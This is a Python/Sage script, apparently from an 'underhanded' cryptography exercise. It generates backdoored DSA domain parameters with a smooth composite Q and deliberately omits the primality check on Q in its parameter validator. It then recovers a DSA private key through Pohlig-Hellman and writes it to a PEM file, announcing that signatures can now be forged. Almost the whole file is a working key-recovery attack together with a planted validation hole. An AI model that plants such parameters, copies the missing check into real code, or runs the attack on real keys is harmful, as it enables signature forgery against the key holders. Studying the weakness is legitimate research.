#
# Copyright (c) 2014 Aleksander Essex (aleks@essex.cc)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import subprocess
import sys
import os.path
import re
import time
import base64
from M2Crypto import DSA

#############
# Mac hack to get around the capitalization issue of the PyCrypto library
import crypto
import sys
sys.modules['Crypto'] = crypto
#############
from Crypto.Util import asn1


###
def log2(x):

	return N(log(x)/log(2))


### Accepts an ASN.1/"OpenSSL binary string" and returns an integer
def decodeOpenSSLinteger(s):

	return Integer(s.encode('hex')[8:],16)


### Accepts an integer and returns an ASN.1/"OpenSSL binary string"
def encodeOpenSSLinteger(myint):

	a = "00" + hex(myint)

	if len(a)%2==1:
		a = "0" + a

	b = ("00000000" + hex(Integer(len(a)/2)))[-8:]

	return (b+a).decode('hex')


### Verifies the correctness of DSA domain parameters (except the primality of Q)
def checkDSAparams():

	try:
		P,G,Q,pub;
	
	except:
		print "[!] Error: There were uninitialized DSA parameters"
		return 0

	if not is_pseudoprime(P):
		print "[!] Error: P is not prime"
		return 0

	# To ensure secure evaluation of DSA, you must check that Q is prime
	# For the sake of this underhanded exercise, however, we'll conveniently "forget"

	if pow(G,Q,P)!=1 or G<2 or G>(P-1):
		print "[!] Error: G does not generate G_Q"
		return 0

	if pow(pub,Q,P)!=1 or pub<2 or pub>(P-1):
		print "[!] Error: public key does not generate G_Q"
		return 0

	return 1


### Generates "evil" DSA parameters. The function generates a smooth composite q, then searches for a prime p such that q|p-1. Finally a suitable generator g is chosen and the parameters are written to .pem file
def genEvilDSAparams(fname):

	# Required bit sizes of p and q (as per OpenSSL/NIST/FIPS requirements)
	pbits = 4096
	qbits = 256

	# Generate q as a smooth composite
	# q must be smooth enough to make Pohlig-Hellman efficient, but large enough that the probability that a random element in Z_q is relatively prime to q is reasonably high (so that its inverse mod q exists with reasonably high probability)
	# This range was chosen by trial and error
	q = prod(primes(32771,32935))

	if ceil(log2(q)) != qbits:
		print "[!] Error: q must be " + str(qbits) + "-bits in size"
		return

	pbits -= floor(log2(q))

	print "[+] Generating evil DSA parameters. This may take some time..."

	while True:

		sys.stdout.write(".")
		sys.stdout.flush()
	 	a=randint(2^(pbits-1),2^(pbits))                                                                                          
		if a%2 == 1:
			a+=1
		p=a*q+1
		if is_pseudoprime(p):
			break

	sys.stdout.write("\n")
	g = Integer(pow(2,(p-1)/q,p))

	if pow(g,q,p)==1:
		print "[+] Evil DSA parameters successfully generated"

	try:
		DSAparams = DSA.set_params(encodeOpenSSLinteger(p),encodeOpenSSLinteger(q),encodeOpenSSLinteger(g))
		DSAparams.save_params(fname)
	except:
		print "[!] There was a problem writing to the DSA parameters file"
		return

	print "[+] Evilized DSA parameters successfully generated"

	return


### Loads DSA public key and params from (openssl) ASN.1/pem file
def load_pub_key(fname):

	global pub, P, Q, G

	print "[+] Loading DSA public key..."

	if not os.path.exists(fname):
		print "[!] Error: File not found..."
		return 0

	try:
		DSAparams = DSA.load_pub_key(fname)

	except:
		print "[!] Error: There was a problem parsing the DSA public key file"
		return 0

	P = decodeOpenSSLinteger(DSAparams.p)
	Q = decodeOpenSSLinteger(DSAparams.q)
	G = decodeOpenSSLinteger(DSAparams.g)
	pub = decodeOpenSSLinteger(DSAparams.pub)

	if not checkDSAparams():
		print "[!] DSA parameters are invalid"
		return 0

	print "[+] DSA parameters were loaded successfully"
	
	return 1


### Solve discrete log, i.e., finds x such that alpha^x = beta mod p, where alpha is a generator of a cyclic group of order n
def baby_step_giant_step(alpha, beta, n):

	if not checkDSAparams():
		return -1

	if pow(alpha,n,P)!=1 or pow(beta,n,P)!=1:
		print "[!] Error: Unable to compute discrete log. Invalid group elements"
		return -1

	m = ceil(sqrt(n))
	DLdict = {}

	for i in range(0,m):
		DLdict[pow(alpha,i,P)] = i

	aim = pow(alpha, n-m, P)
	gamma = beta

	for i in range(0,m):

		if gamma in DLdict:
			x = (i * m + DLdict[gamma])
			if pow(alpha,x,P)==beta:
				return x


		gamma = (gamma * aim) % P

	print "[!] Error: baby step/giant step algorithm failed"
	return -1


### Computes the discrete log of public key pub relative to generator g. I.e., if pub = g^x, the function returns x. In order to run efficiently, the algorithm requires q to be a smooth composite
def PohligHellman():

	global priv

	print "[+] Starting the Pohlig-Hellman algorithm..."

	if not checkDSAparams():
		return 0

	if is_prime(Q):
		print "[!] Q is prime and has not been suitably evalized. Solving the discrete log in G_Q, therefore, will be optimally hard, and solving general discrete log is out of the scope of this program"
		return 0

	print "[+] Beginning to factor Q. This may take a long time..."

	try:
		Qfactors = factor(Q)
	except:
		print "[!] Error: Unable to factor Q"
		return 0

	factors = []
	DiscreteLogs = []

	# Expands any prime powers, e.g., converts [2,3] to 8
	for Qfactor in Qfactors:
		factors.append(Qfactor[0]^Qfactor[1])

	print "[+] Q was successfully factored"
	print "[+] Beginning to compute the discrete log of the public key..."

	count=1
	for factr in factors:
		exponent = (((P-1)/factr)*inverse_mod(Integer((P-1)/factr),factr))%(P-1)
		xi = baby_step_giant_step(pow(G,exponent,P),pow(pub,exponent,P),factr)

		if xi >=0 and xi<P:
			DiscreteLogs.append(xi)
			print "[+] Computed discrete log of factor " + str(count) + " of " + str(len(factors)) + " of Q (approx. " + str(round(N(log(factr)/log(2)),1)) + " bits in length)" 
		else:
			print "[!] There was a problem finding the discrete log of factor " + str(factr) + " of Q" 
			return 0

		count+=1

	print "[+] Found the discrete log of all individual factors of Q"
	print "[+] Using Chinese Remainder Theorem to reassemble private key..."

	try:
		x = CRT_list(DiscreteLogs,factors)
	except:
		print "[!] Error: there was a problem computing the Chinese Remainer"
	

	if pow(G,x,P)==pub:
		print "\n[+] SUCCESS: Private/signing key was successfully recovered and verified correct!"
		priv = x
		return 1
	else:
		print "[!] Error: Private/signing key was not recovered..."
		return 0


### Encodes the recovered DSA private signing key to ASN.1/pem format and writes to file
def writePrivKey(fn):

	seq = asn1.DerSequence()
	seq[:] = [ 0, long(P), long(Q), long(G), long(pub), long(priv) ]

	try:
		f = open("recoveredDSAkey.pem", 'w')
		f.write("-----BEGIN DSA PRIVATE KEY-----\n%s-----END DSA PRIVATE KEY-----" % seq.encode().encode("base64"))
		f.close()
	except:
		"[!] Error: There was an error writing the private key file"

	print "[+] Private key was written to pem encoded DSA keyfile: recoveredDSAkey.pem"
	print "[+] You may use this file to immediately begin forging signatures in OpenSSL"


### Main function to recover private key
def crack(fn):
	start_time = time.time()

	if not load_pub_key(fn):
		print "[!] Public key was not loaded"
		return

	privateKey = PohligHellman()
	if privateKey:
		print "[+] Total time: " + str(round(time.time() - start_time,1)) + " seconds"
		print "\n[+] Private signing key is: " + str(hex(priv))
		print "[+] Writing private key file..."
		writePrivKey(fn)
		print "Thank-you for not checking the primality of Q. Have a nice day.\n\n"
	else:
		print "[!] Private signing key was not recovered"
		return








